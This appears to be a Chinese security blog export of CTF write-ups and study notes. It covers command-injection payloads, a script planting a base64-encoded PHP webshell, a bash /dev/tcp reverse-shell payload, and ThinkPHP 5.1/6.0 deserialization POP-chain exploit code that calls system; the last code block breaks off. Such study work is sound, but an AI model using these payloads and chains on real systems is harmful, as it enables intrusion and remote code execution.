<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?nep&#x3D;&#96;ls&gt;z&#96;;&amp;len&#x3D;7</span><br><span class="line">?nep&#x3D;&#39;&gt;cat&#39;;&amp;len&#x3D;7</span><br><span class="line">?nep&#x3D;&#39;*&gt;z&#39;;&amp;len&#x3D;7</span><br></pre></td></tr></table></figure>

<p>这里还有第二个解：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?nep&#x3D;&#96;$nep&#96;;ls&gt;z&amp;len&#x3D;7</span><br><span class="line">?nep&#x3D;&#96;$nep&#96;;&gt;cat&amp;len&#x3D;7</span><br><span class="line">?nep&#x3D;&#96;$nep&#96;;*&gt;z&amp;len&#x3D;7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?nep&#x3D;&#96;$nep&#96;;ls&gt;z&amp;len&#x3D;7 </span><br><span class="line">&#x2F;&#x2F; 得到目录下文件名</span><br><span class="line">?nep&#x3D;&#96;$nep&#96;;&gt;cat&amp;len&#x3D;7</span><br><span class="line">&#x2F;&#x2F; 生成文件名为cat的文件</span><br><span class="line">?nep&#x3D;&#96;$nep&#96;;*&gt;z&amp;len&#x3D;7</span><br><span class="line">输入通配符*，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数。</span><br><span class="line">最后访问文件z即可。</span><br></pre></td></tr></table></figure>



<p>这里其实len=7能做出来应该并非是出题人的本愿，实际上出题人应该是想让人令len=-1</p>
<p>在php中的测试：</p>
<p><img src="image-20210324193126060.png" alt="image-20210324193126060"></p>
<p>解法三没见过：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">p = <span class="string">r&#x27;&#x27;&#x27;&gt;hp</span></span><br><span class="line"><span class="string">&gt;1.p\\</span></span><br><span class="line"><span class="string">&gt;d\&gt;\\</span></span><br><span class="line"><span class="string">&gt;\ -\\</span></span><br><span class="line"><span class="string">&gt;e64\\</span></span><br><span class="line"><span class="string">&gt;bas\\</span></span><br><span class="line"><span class="string">&gt;7\|\\</span></span><br><span class="line"><span class="string">&gt;XSk\\</span></span><br><span class="line"><span class="string">&gt;Fsx\\</span></span><br><span class="line"><span class="string">&gt;dFV\\</span></span><br><span class="line"><span class="string">&gt;kX0\\</span></span><br><span class="line"><span class="string">&gt;bCg\\</span></span><br><span class="line"><span class="string">&gt;XZh\\</span></span><br><span class="line"><span class="string">&gt;AgZ\\</span></span><br><span class="line"><span class="string">&gt;waH\\</span></span><br><span class="line"><span class="string">&gt;PD9\\</span></span><br><span class="line"><span class="string">&gt;o\ \\</span></span><br><span class="line"><span class="string">&gt;ech\\</span></span><br><span class="line"><span class="string">ls -t&gt;0</span></span><br><span class="line"><span class="string">sh 0&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.130.128:10110/47c87ab02c7cac57165d0c568f0542bc/?nep=&#123;&#125;&amp;len=-1&quot;</span></span><br><span class="line">print(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p.split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    payload = <span class="string">&#x27;`&#x27;</span> + i.strip() + <span class="string">&#x27;`;;&#x27;</span></span><br><span class="line">    print(<span class="string">&quot;[*]&quot;</span> + url.<span class="built_in">format</span>(payload))</span><br><span class="line">    requests.get(url.<span class="built_in">format</span>(payload))</span><br></pre></td></tr></table></figure>

<p>通过注入的方式把文件写进去</p>
<p>解法4更加易懂：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?nep&#x3D;&#96;$_GET[1]&#96;;;&amp;len&#x3D;-1&amp;1&#x3D;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;10110 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<h1 id="easy-tomcat"><a href="#easy-tomcat" class="headerlink" title="easy_tomcat"></a>easy_tomcat</h1><p>跟VNCTF哪个一样，但是这里咋都弹不出来，先pass</p>
<h1 id="bbxhh-revenge"><a href="#bbxhh-revenge" class="headerlink" title="bbxhh_revenge"></a>bbxhh_revenge</h1><p>这题前面感觉就是🤢</p>
<p>最后一步这里感觉还是相当有趣的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$s</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> preg_replace(<span class="string">&#x27;/sys|exec|sh|flag|pass|file|open|dir|2333|;|#|\/\/|&gt;/i&#x27;</span>, <span class="string">&quot;NepnEpneP&quot;</span>, $s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">	$_ = waf($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">	$__ = waf($_GET[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line">	$a = <span class="keyword">new</span> $_($__);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	$a = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">	$c = waf($_GET[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">	$d = waf($_GET[<span class="string">&#x27;d&#x27;</span>]);</span><br><span class="line">	<span class="keyword">eval</span>(<span class="string">&quot;\\<span class="subst">$a</span>-&gt;<span class="subst">$c</span>(<span class="subst">$d</span>);&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	$c = <span class="string">&quot;getMessage&quot;</span>;</span><br><span class="line">	$d = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">eval</span>(<span class="string">&quot;echo \\<span class="subst">$a</span>-&gt;<span class="subst">$c</span>(<span class="subst">$d</span>);&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>出题人说是考察了原生反射的机制（感觉这段时间全都是PHP原生类？），可以去搜一下ReflectionFunction类，利用invokArgs操作，实际上就相当于使用了call_usr_func</p>
<p>出题人的payload：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">index.php?a=ReflectionFunction&amp;b=call_user_func&amp;c=invokeArgs&amp;d=array(%27assert%27,%27s%27.%27how_source(\%27/f\%27.\%27lag\%27)%27)</span><br></pre></td></tr></table></figure>

<p>感觉自己总是不太明白call_user_func能做什么，这里总结一下：</p>
<p>首先书写例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = $_GET[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> call_user_func($a,$b);</span><br></pre></td></tr></table></figure>

<p>经过测试，call_user_func 常用的函数如下：</p>
<h2 id="1-file-get-contents"><a href="#1-file-get-contents" class="headerlink" title="1.file_get_contents"></a>1.file_get_contents</h2><p>这个倒是很好理解：</p>
<p><img src="image-20210324205352364.png" alt="image-20210324205352364"></p>
<p>但是同时要注意的有如下细节：</p>
<h3 id="1-该函数允许使用伪协议"><a href="#1-该函数允许使用伪协议" class="headerlink" title="1.该函数允许使用伪协议"></a>1.该函数允许使用伪协议</h3><p><img src="image-20210324205501930.png" alt="image-20210324205501930"></p>
<h3 id="2-该函数允许file-协议等等，所以你可以这样操作："><a href="#2-该函数允许file-协议等等，所以你可以这样操作：" class="headerlink" title="2.该函数允许file://协议等等，所以你可以这样操作："></a>2.该函数允许file://协议等等，所以你可以这样操作：</h3><p><img src="image-20210324205545033.png" alt="image-20210324205545033"></p>
<p>肯定也支持http协议的啦</p>
<p><img src="image-20210324205632136.png" alt="image-20210324205632136"></p>
<p>但是要注意，file_get_contents该函数并不会自带回显，所以该函数只能用于使用有输出的情况</p>
<h2 id="2-assert-7-0版本才可以使用"><a href="#2-assert-7-0版本才可以使用" class="headerlink" title="2.assert 7.0版本才可以使用"></a>2.assert 7.0版本才可以使用</h2><p>可以直接命令执行，感觉没啥好说的</p>
<h2 id="3-system"><a href="#3-system" class="headerlink" title="3.system"></a>3.system</h2><p>可以直接执行命令了，但是感觉大部分情况也会被ban掉，但是awd说不定用得上呢</p>
<h2 id="4-exec"><a href="#4-exec" class="headerlink" title="4.exec"></a>4.exec</h2><p>和system是一样的，但是需要手动的输出出来</p>
<p><img src="image-20210325135738567.png" alt="image-20210325135738567"></p>
<p><img src="image-20210325135754393.png" alt="image-20210325135754393"></p>
<h2 id="5-shell-exec"><a href="#5-shell-exec" class="headerlink" title="5.shell_exec"></a>5.shell_exec</h2><p>和exec同理，但是两者之间又有区别。首先两者都需要echo 的输出，但是shell_exec的起点就是当前目录，而exec的起点为之前的目录，故两者间还是有区别的</p>
<h2 id="6-passthru"><a href="#6-passthru" class="headerlink" title="6.passthru"></a>6.passthru</h2><p>可以用于读取图片？</p>
<p>不需要echo自己就有回显了</p>
<p><img src="image-20210325140051160.png" alt="image-20210325140051160"></p>
<h2 id="7-pcntl-exec"><a href="#7-pcntl-exec" class="headerlink" title="7.pcntl_exec"></a>7.pcntl_exec</h2><p>不是很好用，这个需要执行参数执行命令，例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> pcntl_exec(“/bin/bash”, <span class="keyword">array</span>(“/tmp/b4dboy.sh”));<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#/tmp/b4dboy.sh</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">ls -l /</span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>但是该函数在7.0已经默认被ban掉了所以并不好用</p>
<p>其他函数命令执行函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ob_start()、unserialize()、creat_function()</span><br><span class="line">usort()、uasort()、uksort()</span><br><span class="line">array_filter()</span><br><span class="line">array_reduce()</span><br><span class="line">array_map()</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>Java</tag>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>nodejs学习笔记</title>
    <url>/2021/03/01/nodejs%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h1><p>现在nodejs来进行rce的题目越来越多了，，必须得学习一波了，这里开始学习</p>
<h2 id="require和export"><a href="#require和export" class="headerlink" title="require和export"></a>require和export</h2><p>在nodejs当中，export用于建立文件的对外接口，你可以理解为在nodejs当中的单个文件都是封闭状态，如果不用export来定义对外的接口，其他文件是无法进行import操作的</p>
<p>require 与 import的区别即是require运行用户动态的来获取需要的包</p>
<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><p>Node.js 对传统的 js 最大的升级就是支持了文件操作和网络编程。内置的 <code>fs</code> 模块对文件读写提供了强大的支持，不仅支持传统的同步文件读写，还支持颇具 js 特色的异步文件读写。</p>
]]></content>
      <tags>
        <tag>nodejs</tag>
        <tag>原型链污染</tag>
      </tags>
  </entry>
  <entry>
    <title>thinkphp5.1反序列化链探索</title>
    <url>/2021/03/31/thinkphp5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8E%A2%E7%B4%A2/</url>
    <content><![CDATA[<p>该链的思路为从Windows.php触发，具有拼接的file_exists进行操作，之后拼接到Conversion.php上，这里自己还刚复现到一半，主要讲一下自己遇见的困难（可能只有我会遇见的问题）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>&#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Conversion</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="title">class</span> <span class="title">Windows</span> <span class="title">extends</span> <span class="title">Pipes</span>&#123;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="title">private</span> $<span class="title">files</span>=[];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$files=[]</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files = $files;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">pivot</span> = <span class="title">new</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>();</span><br><span class="line">    $windows = <span class="keyword">new</span> think\process\pipes\Windows(<span class="keyword">array</span>($pivot));</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($windows));</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>首先，我遇见第一个问题，如何调用到别的属性，其实用use即可。</p>
</li>
<li><p>第二，是我们如何调用一个trait，这种的话一般我们要寻找一个use到该属性的类，在这里我们找到Model类使用了该类，但是model也是抽象类没办法实例化的，所以我们需要再找model的字类，这里就找到了Pivot类，故我们的写法就如上</p>
<p>= =已经找不到这个版本了，官方如果下载5.1的所有版本都找不到了</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>反序列化</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>thinkphp6.0.x反序列化学习</title>
    <url>/2021/03/30/thinkphp6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="POP1"><a href="#POP1" class="headerlink" title="POP1"></a>POP1</h1><p>这在条链当中，我们的最终目的是利用这里进行任意函数调用，因为三个参数全部可控所以我们能够成功操作</p>
<p><img src="image-20210330112002247.png" alt="image-20210330112002247"></p>
<p>我们接下来就找哪里可以触发这里：</p>
<p>之后将会在getAttr中找到这里：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span>(<span class="params"><span class="keyword">string</span> $name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $relation = <span class="literal">false</span>;</span><br><span class="line">            $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="built_in">InvalidArgumentException</span> $e) &#123;</span><br><span class="line">            $relation = <span class="keyword">$this</span>-&gt;isRelationAttr($name);</span><br><span class="line">            $value    = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// 上面走完回来继续执行getValue</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getValue($name, $value, $relation);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>先不管如何控制参数，我们再寻找如何触发到getAttr，最后我们就将在Conversion.php当中找到toArray。</p>
<p>中间的代码很多但是没啥用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">           <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Model || $val <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">               <span class="comment">// 关联模型对象</span></span><br><span class="line">               <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[$key]) &amp;&amp; is_array(<span class="keyword">$this</span>-&gt;visible[$key])) &#123;</span><br><span class="line">                   $val-&gt;visible(<span class="keyword">$this</span>-&gt;visible[$key]);</span><br><span class="line">               &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key]) &amp;&amp; is_array(<span class="keyword">$this</span>-&gt;hidden[$key])) &#123;</span><br><span class="line">                   $val-&gt;hidden(<span class="keyword">$this</span>-&gt;hidden[$key]);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="comment">// 关联模型对象</span></span><br><span class="line">               <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key]) || <span class="literal">true</span> !== <span class="keyword">$this</span>-&gt;hidden[$key]) &#123;</span><br><span class="line">                   $item[$key] = $val-&gt;toArray();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[$key])) &#123;</span><br><span class="line">               $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">               <span class="comment">#<span class="doctag">TODO:</span> 最后我们要让他调到这个getAttr函数来来</span></span><br><span class="line">           &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key]) &amp;&amp; !$hasVisible) &#123;</span><br><span class="line">               <span class="comment">// phpinfo();</span></span><br><span class="line">               $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>那么我们看看如何触发toArray，最后我们就会发现在__toString时可以触发，故我们将其down下来.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span>(<span class="params"><span class="keyword">int</span> $options = JSON_UNESCAPED_UNICODE</span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;toArray(), $options);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">#<span class="doctag">TODO:</span> Conversion.php作为后半段起点，通过toString触发</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;toJson();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>所以再之后我们就需要寻找可以任意控制参数的__toString方法。在Model方法当中可以寻找到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">#<span class="doctag">TODO:</span> 从这里触发</span></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;lazySave) &#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;进入lazySave函数！&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>找到save函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="keyword">array</span> $data = [], <span class="keyword">string</span> $sequence = <span class="literal">null</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 数据对象赋值</span></span><br><span class="line">        <span class="comment">// phpinfo();</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;setAttrs($data);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isEmpty() || <span class="literal">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">&#x27;BeforeWrite&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">// phpinfo();</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// phpinfo();</span></span><br><span class="line">        <span class="comment">#<span class="doctag">TODO:</span> lazySave函数，为了保证isEmpty为假需要给data赋值</span></span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;exists ? <span class="keyword">$this</span>-&gt;updateData() : <span class="keyword">$this</span>-&gt;insertData($sequence);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === $result) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们需要落到updateData函数当中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">updateData</span>(<span class="params"></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">// 事件回调</span></span><br><span class="line">       <span class="comment">// phpinfo();</span></span><br><span class="line">       <span class="comment">// echo &quot;进入updateDate函数&quot;.&quot;&lt;br&gt;&quot;;</span></span><br><span class="line">       <span class="keyword">if</span> (<span class="literal">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">&#x27;BeforeUpdate&#x27;</span>)) &#123;</span><br><span class="line">           <span class="comment">// phpinfo();</span></span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">           </span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">// phpinfo();</span></span><br><span class="line">       <span class="keyword">$this</span>-&gt;checkData();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 获取有更新的数据</span></span><br><span class="line">       $data = <span class="keyword">$this</span>-&gt;getChangedData();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">empty</span>($data)) &#123;</span><br><span class="line">           <span class="comment">// 关联更新</span></span><br><span class="line">           <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;relationWrite)) &#123;</span><br><span class="line">               <span class="keyword">$this</span>-&gt;autoRelationUpdate();</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;autoWriteTimestamp &amp;&amp; <span class="keyword">$this</span>-&gt;updateTime &amp;&amp; !<span class="keyword">isset</span>($data[<span class="keyword">$this</span>-&gt;updateTime])) &#123;</span><br><span class="line">           <span class="comment">// 自动写入更新时间</span></span><br><span class="line">           $data[<span class="keyword">$this</span>-&gt;updateTime]       = <span class="keyword">$this</span>-&gt;autoWriteTimestamp(<span class="keyword">$this</span>-&gt;updateTime);</span><br><span class="line">           <span class="keyword">$this</span>-&gt;data[<span class="keyword">$this</span>-&gt;updateTime] = $data[<span class="keyword">$this</span>-&gt;updateTime];</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 检查允许字段</span></span><br><span class="line">       <span class="comment">// phpinfo();</span></span><br><span class="line">       $allowFields = <span class="keyword">$this</span>-&gt;checkAllowFields();</span><br><span class="line">       <span class="comment">// phpinfo();</span></span><br></pre></td></tr></table></figure>

<p>我们要确保调到checkAllowFields函数当中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">checkAllowFields</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">// 检测字段</span></span><br><span class="line">       <span class="comment">// phpinfo();</span></span><br><span class="line">       <span class="comment">// var_dump($this-&gt;field);</span></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;field)) &#123;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;schema)) &#123;</span><br><span class="line">               </span><br><span class="line">               <span class="comment">#<span class="doctag">TODO:</span> </span></span><br><span class="line">               <span class="comment">// phpinfo();</span></span><br><span class="line">               <span class="keyword">$this</span>-&gt;field = array_keys(array_merge(<span class="keyword">$this</span>-&gt;schema, <span class="keyword">$this</span>-&gt;jsonType));</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">// 就在这里进行了字符串操作</span></span><br><span class="line">               $table = <span class="keyword">$this</span>-&gt;table ? <span class="keyword">$this</span>-&gt;table . <span class="keyword">$this</span>-&gt;suffix : $query-&gt;getTable();</span><br><span class="line">               <span class="comment">// phpinfo();</span></span><br><span class="line">               </span><br><span class="line">               <span class="keyword">$this</span>-&gt;field = $query-&gt;getConnection()-&gt;getTableFields($table);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="comment">// phpinfo();</span></span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;field;</span><br></pre></td></tr></table></figure>

<p>在这里我们发现关键的地方就进行了字符串拼接操作，那么我们令$this-&gt;table 为model类即可，但是实际拼接payload当中我们会发现该类无法直接使用，所以需要重新寻找子类</p>
<p>最终得到：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>;</span><br><span class="line"><span class="keyword">trait</span> Conversion</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">trait</span> Attribute</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> $data;</span><br><span class="line">    <span class="keyword">private</span> $withAttr = [<span class="string">&quot;axin&quot;</span> =&gt; <span class="string">&quot;system&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">&quot;axin&quot;</span> =&gt; <span class="string">&quot;ls&quot;</span>];  <span class="comment">//你想要执行的命令，这里的键值只需要保持和withAttr里的键值一致即可</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="comment">// use model\concern\Attribute;</span></span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">    <span class="keyword">private</span> $lazySave;</span><br><span class="line">    <span class="keyword">private</span> $exists;</span><br><span class="line">    <span class="keyword">private</span> $data;</span><br><span class="line">    <span class="keyword">private</span> $field;</span><br><span class="line">    <span class="keyword">private</span> $schema;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> $table;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// $this-&gt;get();</span></span><br><span class="line">        <span 